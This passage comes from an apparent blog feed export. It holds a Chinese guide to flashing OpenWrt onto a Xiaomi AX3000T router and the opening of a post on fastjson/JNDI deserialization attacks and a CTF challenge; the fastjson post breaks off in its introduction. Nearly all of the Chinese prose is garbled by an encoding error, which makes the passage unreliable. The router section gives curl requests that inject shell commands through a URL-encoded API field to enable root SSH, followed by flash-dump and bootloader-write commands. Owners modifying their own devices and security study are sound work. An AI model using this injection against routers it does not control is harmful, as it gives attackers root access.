ROMï¼Œå®Œæˆä¹‹åå˜è“ç¯é—ªçƒï¼Œåˆ·æœºæˆåŠŸï¼Œæ–­ç”µé‡å¯è·¯ç”±å™¨ã€‚</p><p>æˆ‘é‡åˆ°çš„é—®é¢˜æ˜¯è·¯ç”±å™¨çš„è¯·æ±‚è¿Ÿè¿Ÿæ²¡æœ‰å‡ºç°ï¼ŒæŒ‡ç¤ºç¯ä¸€ç›´åœ¨æ©™ç¯é•¿äº®ã€æ©™ç¯é—ªçƒä¹‹é—´å¾ªç¯ï¼Œåæ¥å‘ç°éœ€è¦å…ˆæš‚æ—¶å…³é—­ windows çš„é˜²ç«å¢™ï¼Œå¦åˆ™ç”µè„‘ä¸ä¼šæ¥æ”¶è·¯ç”±å™¨çš„è¯·æ±‚ã€‚</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/BcSQb7k5So2YtSx0i04cCuH4nrc.png"></p><h3 id="ä¿®æ”¹è·¯ç”±å™¨é…ç½®å¯ç”¨-ssh"><a href="#ä¿®æ”¹è·¯ç”±å™¨é…ç½®å¯ç”¨-ssh" class="headerlink" title="ä¿®æ”¹è·¯ç”±å™¨é…ç½®å¯ç”¨ ssh"></a>ä¿®æ”¹è·¯ç”±å™¨é…ç½®å¯ç”¨ ssh</h3><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/Zxk4bIl24oM7mJx1XA1c0zKBnye.png"></p><p>éœ€ä½¿ç”¨ cmd ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œ<code>&lt;stok&gt;</code> å¤„å¡«å…¥è®¿é—®è·¯ç”±å™¨ç®¡ç†é¡µé¢çš„ <code>stok</code> å­—æ®µå†…å®¹ï¼Œä½¿ç”¨ PowerShell è§£æå‚æ•°é”™è¯¯ä¼šæŠ¥é”™ã€‚æ¯æ¬¡éƒ½è¦è¿”å› <code>&#123;&quot;code&quot;:0&#125;</code> æ‰ç®—æˆåŠŸã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0Anvram%20set%20ssh_en%3D1%0A&quot;</span><br>curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0Anvram%20commit%0A&quot;</span><br>curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0Ased%20-i%20&#x27;s%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg&#x27;%20%2Fetc%2Finit.d%2Fdropbear%0A&quot;</span><br>curl -X POST http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">31.1</span>/cgi-bin/luci/;stok=&lt;stok&gt;<span class="hljs-regexp">/api/mis</span>ystem/arn_switch -d <span class="hljs-string">&quot;open=1&amp;model=1&amp;level=%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A&quot;</span><br></code></pre></td></tr></table></figure><h3 id="ssh-ç™»å…¥"><a href="#ssh-ç™»å…¥" class="headerlink" title="ssh ç™»å…¥"></a>ssh ç™»å…¥</h3><p>è€Œåå°è¯•ç›´æ¥ ssh ç™»å½•ï¼ŒæŠ¥é”™ï¼Œéœ€è¦ç”¨ ssh-rsa åå•†</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/VuDJbZgDfosQQOxjhBhcfWZenqb.png"></p><p>æ”¹ç”¨å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.31.1<br></code></pre></td></tr></table></figure><p>ç™»å½•å¯†ç éœ€è¦ç”¨è·¯ç”±ç®¡ç†ç•Œé¢ SN çš„å…¨éƒ¨å†…å®¹æ”¾åˆ° <a href="https://miwifi.dev/ssh">https://miwifi.dev/ssh</a> å¤„ç†è·å–ï¼Œæ³¨æ„ Ctrl+v æ— æ³•ä½¿ç”¨ï¼Œå³é”®ç²˜è´´</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/WqFGbsLi1oqKktxWV99cESHVnOh.png"></p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/MsNabZPz6o2VSSx54wecGYHnnDe.png"></p><h2 id="åˆ·å…¥-U-Boot"><a href="#åˆ·å…¥-U-Boot" class="headerlink" title="åˆ·å…¥ U-Boot"></a>åˆ·å…¥ U-Boot</h2><p>U-Boot å…¨ç§° Universal Boot Loaderï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„å¼•å¯¼åŠ è½½ç¨‹åºï¼Œå¹¿æ³›åº”ç”¨äºåµŒå…¥å¼ç³»ç»Ÿä¸­ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åˆå§‹åŒ–ç¡¬ä»¶è®¾å¤‡ï¼Œå»ºç«‹å†…å­˜ç©ºé—´çš„æ˜ å°„å›¾ï¼ŒåŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œï¼Œä¸ºæ“ä½œç³»ç»Ÿçš„å¯åŠ¨æä¾›å¿…è¦çš„å‡†å¤‡ã€‚</p><h3 id="å¤‡ä»½åŸå›ºä»¶"><a href="#å¤‡ä»½åŸå›ºä»¶" class="headerlink" title="å¤‡ä»½åŸå›ºä»¶"></a>å¤‡ä»½åŸå›ºä»¶</h3><p>ä¸ºäº†é¿å…åç»­å‡ºç°æ„å¤–å¯¼è‡´éš¾ä»¥ä¿®å¤ï¼Œå…ˆå¤‡ä»½å›ºä»¶ä»¥é˜²ä¸‡ä¸€ã€‚<code>cat /proc/mtd</code> æŸ¥çœ‹æ‰€æœ‰åˆ†åŒº</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/OKGzbOTXsoNZllxPVNMc3lMrnpc.png"></p><p>ç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¾æ¬¡æ‰“åŒ… 1~12 å…± 12 ä¸ªåˆ†åŒº</p><div class="note note-warning">            <p><strong>æ³¨æ„ï¼š</strong></p><p>è¯·ä¸è¦å·æ‡’æƒ³è¦ä¸€æ¬¡æ€§å®Œæˆä¸‹é¢æ‰€æœ‰æ“ä½œï¼Œç”±äºè·¯ç”±å™¨çš„ ROM é€šå¸¸è¾ƒå°ï¼Œä¸€æ¬¡æ€§å¤§é‡çš„å¤‡ä»½æ“ä½œä¼šè®© ROM â€œçˆ†æ‰â€ï¼Œæœ€å¥½æ¯ä¸€ä¸ªéƒ½å•ç‹¬å¤‡ä»½ï¼Œä¸”å¤‡ä»½å®Œæˆåå°±ä¸‹è½½å¹¶åˆ é™¤ã€‚è¿™æ˜¯æ¥è‡ª zkz098 çš„æé†’ã€‚</p><p>å…¶ä¸­ mtd0 ä¼¼ä¹æ˜¯ä¼—å¤šåˆ†åŒºçš„æ±‡æ€»ï¼Œæ— éœ€é‡å¤å¤‡ä»½ï¼Œè€Œæˆ‘åœ¨å¥½å¥‡å¿ƒçš„é©±ä½¿ä¸‹å°è¯•åœ¨å®Œæˆå…¶ä»–æ‰€æœ‰åˆ†åŒºçš„å¤‡ä»½åå¯¹å…¶è¿›è¡Œå¤‡ä»½ï¼Œå¯¼è‡´è·¯ç”±å™¨å´©æºƒé‡å¯â€¦â€¦</p><p>é‚£ä¹ˆä¸Šè¿°é—®é¢˜ä¸€èˆ¬è€Œè¨€çš„åº”å¯¹æ–¹æ³•æ˜¯ï¼šé‡å¯è·¯ç”±å™¨åé‡å¤â€œä¿®æ”¹è·¯ç”±å™¨é…ç½®å¯ç”¨ sshâ€åˆ°â€œssh ç™»å½•â€æ­¥éª¤</p>          </div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd1 of=/tmp/BL2.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd2 of=/tmp/Nvram.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd3 of=/tmp/Bdate.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd4 of=/tmp/Factory.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd5 of=/tmp/FIP.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd6 of=/tmp/crash.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd7 of=/tmp/crash_log.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd8 of=/tmp/ubi.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd9 of=/tmp/ubi1.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd10 of=/tmp/overlay.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd11 of=/tmp/date.bin<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtd12 of=/tmp/KF.bin<br></code></pre></td></tr></table></figure><p>å•å¥æ‰§è¡Œæ•ˆæœå¦‚ä¸‹</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/VIsgbXhqlogbaNxWxO1cX18snUg.png"></p><p>éšåå°†æ‰“åŒ…å¥½çš„ bin æ–‡ä»¶ä¼ å›ç”µè„‘ä¿å­˜ï¼Œè·¯ç”±å™¨åŸæœ¬è‡ªå¸¦ netcat ä½†åŠŸèƒ½ä¸å®Œæ•´ï¼Œä¸å¥½ç”¨ï¼Œæ‰€ä»¥ä¸ºäº†æ–¹ä¾¿èµ·è§ä½¿ç”¨ WinSCP å¯¹æ–‡ä»¶è¿›è¡Œä¼ è¾“ç®¡ç†ã€‚</p><p>ä½¿ç”¨ WinSCP å»ºç«‹è¿æ¥ï¼Œæ³¨æ„åè®®éœ€é€‰æ‹© SCPï¼Œå…¶ä»–æ— æ³•è¿æ¥ï¼Œå¯†ç å³ä¹‹å‰è·å–çš„å¯†ç ã€‚</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/Zba8brDVDoiCuzxNqlDcO0r7nEg.png"></p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/WfW4bONy7oDyaJxmsR1ctn3ynls.png"></p><p>è€Œåå‘ç”Ÿçš„å°±æ˜¯æˆ‘æŠŠè·¯ç”±å™¨ç©å´©äº†ï¼Œé‡æ–° ssh ç™»å½•æ—¶æç¤º SHA256 è®¤è¯ä¿¡æ¯æ”¹å˜ï¼Œè¯¥è®¾å¤‡ä¸å—ä¿¡ä»»</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/WhJVb6SmTob9WwxVvwPcJfQ2nxe.png"></p><p>è¿™æ˜¯å› ä¸ºä¹‹å‰è¿æ¥çš„æ—¶å€™ä¿å­˜äº†æŒ‡çº¹ä¿¡æ¯ï¼Œç°åœ¨å¯¹ä¸ä¸Šäº†ï¼Œç”¨ <code>ssh-keygen -R 192.168.31.1</code> æ¸…é™¤åŸæœ¬ä¿å­˜ç€çš„ 192.168.31.1 ç›¸å…³æŒ‡çº¹å³å¯ã€‚</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/HqXBbUnoJoOF9TxGUVccZA5Mntb.png"></p><h3 id="åˆ·å…¥-U-Boot-å›ºä»¶"><a href="#åˆ·å…¥-U-Boot-å›ºä»¶" class="headerlink" title="åˆ·å…¥ U-Boot å›ºä»¶"></a>åˆ·å…¥ U-Boot å›ºä»¶</h3><p><strong>ç¡®ä¿å¤‡ä»½å®Œæˆå</strong>ï¼Œç”¨ WinSCP æŠŠå›ºä»¶æ–‡ä»¶ä¼ è¾“åˆ°è·¯ç”±å™¨ä¸Šï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†å›ºä»¶å†™å…¥ FIP åˆ†åŒº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtd write mt7981_ax3000t-fip-fixed-parts-multi-layout.bin FIP<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/V71ubshtDoNGQAxpnBBc4DvFnbf.png"></p><p>è¿™æ­¥ç»“æŸå³å®Œæˆäº† U-Boot å›ºä»¶çš„åˆ·å…¥</p><h2 id="åˆ·å…¥-openwrt"><a href="#åˆ·å…¥-openwrt" class="headerlink" title="åˆ·å…¥ openwrt"></a>åˆ·å…¥ openwrt</h2><p>æ¥ä¸‹æ¥è¦ç”¨ U-Boot åŠ è½½ openwrt çš„å›ºä»¶åˆ·å…¥</p><h3 id="é…ç½®ç½‘ç»œè¿æ¥"><a href="#é…ç½®ç½‘ç»œè¿æ¥" class="headerlink" title="é…ç½®ç½‘ç»œè¿æ¥"></a>é…ç½®ç½‘ç»œè¿æ¥</h3><p>ç›®å‰ç½‘çº¿ä»ç„¶è¿æ¥ç€ç”µè„‘ä¸è·¯ç”±å™¨ï¼Œç”±äº uboot ä¸å…·å¤‡ DHCP èƒ½åŠ›ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨é…ç½®ä¸€ä¸‹ç½‘å¡æ¥è®¿é—® uboot çš„ç•Œé¢</p><p>å°† IP åˆ†é…æ¨¡å¼è®¾ä¸ºæ‰‹åŠ¨ï¼Œé€‰ä¸€ä¸ªä¸ä¼šå†²çªçš„ IPv4 åœ°å€ï¼Œæ©ç ã€ç½‘å…³å¦‚ä¸‹ï¼ŒDNS æœåŠ¡å™¨é€‰æ‹©å›½å†…èƒ½ç”¨çš„ä¸”ä¸å»ºè®®åŠ å¯†</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/GYCPbgH4VoFirSxHqgec5zzOnsc.png"></p><h3 id="åˆ·å…¥-openwrt-å›ºä»¶"><a href="#åˆ·å…¥-openwrt-å›ºä»¶" class="headerlink" title="åˆ·å…¥ openwrt å›ºä»¶"></a>åˆ·å…¥ openwrt å›ºä»¶</h3><p>è®¿é—® 192.168.1.1 çš„ U-Boot é¡µé¢ï¼Œé€‰æ‹©è¦ä¸Šä¼ çš„æœ¬åœ°çš„ openwrt å›ºä»¶ï¼Œå¹¶é€‰æ‹©ç›¸åº”çš„ <code>mtd layout</code>ï¼ˆQWRT é€‰ QWRTï¼Œimmortalwrt é€‰ immortalwrt-w112ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„å›ºä»¶æ˜¯ QWRTï¼‰ï¼Œè€Œåç‚¹å‡» Uploadã€‚</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/EATQbRa6HokI28xlenxctdQanPd.png"></p><p>ä¸Šä¼ å®Œæˆåå†ç‚¹å‡» Updateï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è·¯ç”±å™¨ä¼šå˜ä¸ºæ©™ç¯ï¼Œéšåæ©™ç¯å¿«é€Ÿé—ªçƒï¼Œå†å˜ä¸ºè“ç¯ï¼Œæ­¤æ—¶åˆ·å…¥æˆåŠŸã€‚</p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/G8bsbfzEgoUhXlxL4XQcBAVgnDg.png"></p><p>å¦‚æœè§‚å¯Ÿåˆ°è·¯ç”±å™¨çš„æ©™ç¯æ…¢é€Ÿé—ªçƒ (çº¦ 5 ç§’ä¸€æ¬¡)ï¼Œæ­¤æ—¶è¯·ç­‰å¾…åŠåˆ†é’Ÿï¼Œå¦‚æœä»ç„¶ä¿æŒæ­¤çŠ¶æ€ï¼Œå¯ä»¥æŒ‰ç…§å‰æ–‡é‡æ–°è¿›å…¥ UBoot äº†ã€‚è¿™ä¸ªé—ªçƒæ„å‘³ç€å›ºä»¶åˆ·å…¥å¤±è´¥ï¼ŒUBoot ä¼šæç¤º UPDATE FAILEDï¼Œå»ºè®®æ›´æ¢å›ºä»¶å¹¶é€‰æ‹©æ­£ç¡®çš„ mtd layout åé‡è¯•</p><h2 id="ç™»å½•-openwrt"><a href="#ç™»å½•-openwrt" class="headerlink" title="ç™»å½• openwrt"></a>ç™»å½• openwrt</h2><p>QWRT çš„é»˜è®¤ç®¡ç†é¡µé¢åœ°å€ä¸º 192.168.1.1ï¼Œé»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç  <code>root</code>ã€<code>password</code></p><p><img src="/img/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/Sf8EbAJejoFXMXxsEANcuxDhn1W.png"></p><p>å®Œæˆï¼Œå¸…~</p><h1 id="å¦‚ä½•åˆ·å›åŸå‚ï¼Ÿ"><a href="#å¦‚ä½•åˆ·å›åŸå‚ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ·å›åŸå‚ï¼Ÿ"></a>å¦‚ä½•åˆ·å›åŸå‚ï¼Ÿ</h1><p>æ¥è‡ª zkz098 çš„å®è·µç»éªŒï¼š</p><blockquote><p>å…ˆæ¢å¤åŸå‚ UBoot åä½¿ç”¨å°ç±³æ•‘ç –å·¥å…·åˆ·å…¥å›ºä»¶<br>æ‰¾åˆ°å‰æ–‡çš„å¤‡ä»½æ–‡ä»¶ä¸­çš„ <code>FIP.bin</code> ï¼Œä½¿ç”¨ SSH å·¥å…·ä¸Šä¼ åˆ° &#x2F;tmp ç›®å½•ä¸‹ï¼Œéšåï¼š<code>mtd write FIP.bin FIP</code> ç­‰å¾…å‘½ä»¤å®Œæˆ (15-30 ç§’å·¦å³) åæ–­ç”µé‡å¯ï¼Œæ­¤æ—¶æŒ‰ç…§å‰æ–‡çš„é™çº§æ–¹æ³•åˆ·å…¥åŸå‚ 1.0.47 å›ºä»¶ (å¯èƒ½éœ€è¦å¤šæ¬¡åˆ·å…¥)<br>å¦‚æœåˆ·å…¥æˆåŠŸï¼Œæ©™ç¯ä¼šå¸¸äº®ä¸€ä¼šï¼Œç„¶åæ©™ç¯é—ªçƒï¼Œæ­¤æ—¶å¯ä»¥æŒ‰ç…§æ­£å¸¸æ–°è·¯ç”±å™¨çš„æ–¹æ³•ï¼Œè¿æ¥åˆ°æ— å¯†ç é»˜è®¤ SSID ä¸­è¿›å…¥å¼€å§‹ä½¿ç”¨</p></blockquote><h1 id="å‚è€ƒèµ„æ–™ï¼š"><a href="#å‚è€ƒèµ„æ–™ï¼š" class="headerlink" title="å‚è€ƒèµ„æ–™ï¼š"></a>å‚è€ƒèµ„æ–™ï¼š</h1><p>zkz098 çš„æ–‡ç« ï¼Œæ‰€éœ€å›ºä»¶å¯ä»¥ä»ä¸‹æ–¹æ–‡ç« ä¸­è·å–ï¼Œæˆ–è€…ç½‘ä¸Šå¯»æ‰¾ï¼Œæˆ–è€…è‡ªè¡Œç¼–è¯‘ï¼Œè¿™ç¯‡æ˜¯ä¸»è¦å‚è€ƒï¼Œå¾ˆè¯¦ç»†ï¼š</p><p><a href="https://www.kaitaku.xyz/misc/ax3000t-openwrt/">https://www.kaitaku.xyz/misc/ax3000t-openwrt/</a></p><p>å›ºä»¶é™çº§ç¤ºèŒƒï¼š</p><p><a href="https://www.bilibili.com/video/BV1jZ421875V/?vd_source=ae44e9df2e6bb265e83888153930e885">https://www.bilibili.com/video/BV1jZ421875V/?vd_source&#x3D;ae44e9df2e6bb265e83888153930e885</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç½‘</tag>
      
      <tag>openwrt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson+jndi æ¼æ´å¤ç°åŠ HgameFinal æŸé¢˜å¤ç°</title>
    <link href="/2025/04/14/fastjson+jndi%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8AHgameFinal%E6%9F%90%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/14/fastjson+jndi%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8AHgameFinal%E6%9F%90%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="fastjson-jndi-æ¼æ´å¤ç°åŠ-HgameFinal-æŸé¢˜å¤ç°"><a href="#fastjson-jndi-æ¼æ´å¤ç°åŠ-HgameFinal-æŸé¢˜å¤ç°" class="headerlink" title="fastjson+jndi æ¼æ´å¤ç°åŠ HgameFinal æŸé¢˜å¤ç°"></a>fastjson+jndi æ¼æ´å¤ç°åŠ HgameFinal æŸé¢˜å¤ç°</h1><h1 id="é˜…å‰å£°æ˜"><a href="#é˜…å‰å£°æ˜" class="headerlink" title="é˜…å‰å£°æ˜"></a>é˜…å‰å£°æ˜</h1><p>æœ¬ç¯‡å†…å®¹æ¶‰åŠ fastjson ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸»è¦ 1.2.47ï¼‰ã€jndi æ³¨å…¥æ¼æ´ï¼ˆä¸»è¦ com.sun.rowset.JdbcRowSetImpl ç”¨ ldap è¿”å› Reference åŠ è½½è¿œç¨‹ç±»æ–¹å¼ï¼‰ã€HgameFinal2025-ezjson å¤ç°ï¼ˆfastjson1.2.47+JdbcRowSetImpl ç”¨ ldap è¿”å›æ•°æ®æµ +Jackson åŸç”Ÿååºåˆ—åŒ–ï¼‰ã€‚æ­¤å¤–è¿˜åŒ…æ‹¬éƒ¨åˆ† jdk ç‰ˆæœ¬ã€ä¾èµ–ç‰ˆæœ¬çš„å„ç§ç»•è¿‡æ–¹å¼ï¼Œä½†ç”±äºç¯‡å¹…æœ‰é™ä¸å®œè¿‡å¤šï¼Œæ‰€ä»¥é™¤äº†åˆ‡å®å®è·µè¿‡çš„å†…å®¹å¤–ä¸»è¦åˆ—ä¸¾æˆ‘æ‰€å­¦ä¹ åˆ°çš„æ–‡ç« ã€‚</p><p>æœ¬ç¯‡ç›®çš„åœ¨äºè®°å½•å­¦ä¹ è¿‡ç¨‹å­¦ä¹ æˆæœã€æ–¹ä¾¿å›é¡¾ã€å¿«é€ŸæŸ¥è¯¢èµ„æ–™ï¼Œå‚è€ƒäº†å¤§é‡æ–‡ç« ï¼Œæ‰€ä»¥æœ‰è®¸å¤šçš„æ–‡ç« é“¾æ¥ã€å¼•ç”¨ï¼ˆæ–‡ç« å†…å®¹å¯èƒ½éƒ¨åˆ†æœ‰é‡å¤ï¼‰ï¼Œä¸”åŸºæœ¬æ ‡æ³¨äº†å„ç¯‡æ–‡ç« æˆ‘è®¤ä¸ºå¸®åŠ©äº†æˆ‘ç†è§£çš„å†…å®¹æˆ–å…¶é•¿å¤„ã€‚åŒæ—¶ï¼Œç”±äºåˆå­¦ï¼Œå†…å®¹ååŸºç¡€ï¼Œç»è¿‡å¤šæ¬¡æ”¹åŠ¨ä¿®æ­£ã€‚</p><h1 id="æ¼æ´å¤ç°ç¯å¢ƒé…ç½®æ³¨æ„äº‹é¡¹"><a href="#æ¼æ´å¤ç°ç¯å¢ƒé…ç½®æ³¨æ„äº‹é¡¹" class="headerlink" title="æ¼æ´å¤ç°ç¯å¢ƒé…ç½®æ³¨æ„äº‹é¡¹"></a>æ¼æ´å¤ç°ç¯å¢ƒé…ç½®æ³¨æ„äº‹é¡¹</h1><p>ä¸ºäº†æ–¹ä¾¿æ¼æ´å¤ç°ï¼Œä½¿ç”¨çš„ jdk ç‰ˆæœ¬è¦ 1.8ï¼Œä¸”å°äºç­‰äº oracle 8u191ï¼Œæˆ‘è¿™æ¬¡ä½¿ç”¨çš„æ˜¯ oracle 8u181ï¼Œå®˜ç½‘ä¸‹è½½éœ€è¦æ³¨å†Œè´¦æˆ·ï¼Œå¯ä»¥é€‰æ‹©åä¸ºé•œåƒæºä¸‹è½½ã€‚ä¸€å®šè¦æ³¨æ„ jdk ç‰ˆæœ¬ï¼Œå¦åˆ™æ— æ³•é¡ºåˆ©æ‰§è¡Œå‘½ä»¤ã€‚ä¸‹é¢çš„åŸç†åˆ†æåŠæ”»å‡»å®ç°æµç¨‹åˆ†æå‡é’ˆå¯¹ oracle 8u181ï¼Œfastjson1.2.47ã€‚</p><p><a href="https://blog.csdn.net/qq_43362426/article/details/111370493">idea æ›´æ¢ jdk ç‰ˆæœ¬ä¿®æ”¹ä½ç½®</a></p><h1 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h1><h2 id="fastjson-åŠŸèƒ½ã€åºåˆ—åŒ–ååºåˆ—åŒ–"><a href="#fastjson-åŠŸèƒ½ã€åºåˆ—åŒ–ååºåˆ—åŒ–" class="headerlink" title="fastjson åŠŸèƒ½ã€åºåˆ—åŒ–ååºåˆ—åŒ–"></a>fastjson åŠŸèƒ½ã€åºåˆ—åŒ–ååºåˆ—åŒ–</h2><p>å³å°† JavaBean è½¬ä¸º json å­—ç¬¦ä¸²æˆ–è§£æ json è½¬ä¸º JavaBeanï¼Œå³åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æ“ä½œ</p><p>å…³äº java çš„åºåˆ—åŒ–ååºåˆ—åŒ–æ˜¯ä»€ä¹ˆæ ·å­ã€åŸç”Ÿåºåˆ—åŒ–æ–¹å¼å’Œ fastjson åºåˆ—åŒ–æ–¹å¼çš„åŒºåˆ«å¯ä»¥å‚ç…§<a href="https://www.freebuf.com/articles/web/369926.html">è¿™ç¯‡</a>å‰åŠéƒ¨åˆ†çœ‹ä¸€çœ‹</p><h2 id="ä¸ªäººç†è§£"><a href="#ä¸ªäººç†è§£" class="headerlink" title="ä¸ªäººç†è§£"></a>ä¸ªäººç†è§£</h2><p>ä¸ªäººè®¤ä¸º fastjson ååºåˆ—åŒ–æ¼æ´ä¸»è¦æš´éœ²çš„é£é™©æ˜¯ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´å®ç°éƒ¨åˆ† java ç±»ã€å®ä¾‹ç­‰çš„æ“æ§ï¼Œè€Œåå°±æ˜¯åˆ©ç”¨ä¾‹å¦‚ JdbcRowSetImplã€TemplatesImpl è¿›è¡Œ JNDI æ³¨å…¥ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ä¸ªäººæ„Ÿè§‰è¦æ¯”è¾ƒå…¨é¢åœ°åˆ†ææ”»å‡»çš„å®ç°éœ€è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šä¸€ä¸ªå°±æ˜¯ fastjson ååºåˆ—åŒ–æ¼æ´æœ¬èº«æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€ä¸åŒçš„å®‰å…¨æ£€æµ‹æ˜¯å¦‚ä½•ç»•è¿‡çš„ï¼›å¦ä¸€ä¸ªå°±æ˜¯ fastjson ååºåˆ—åŒ–æ¼æ´å¯ä»¥åˆ©ç”¨åï¼Œå¯ä»¥ç»“åˆå…¶ä»–å“ªäº›æ¼æ´ 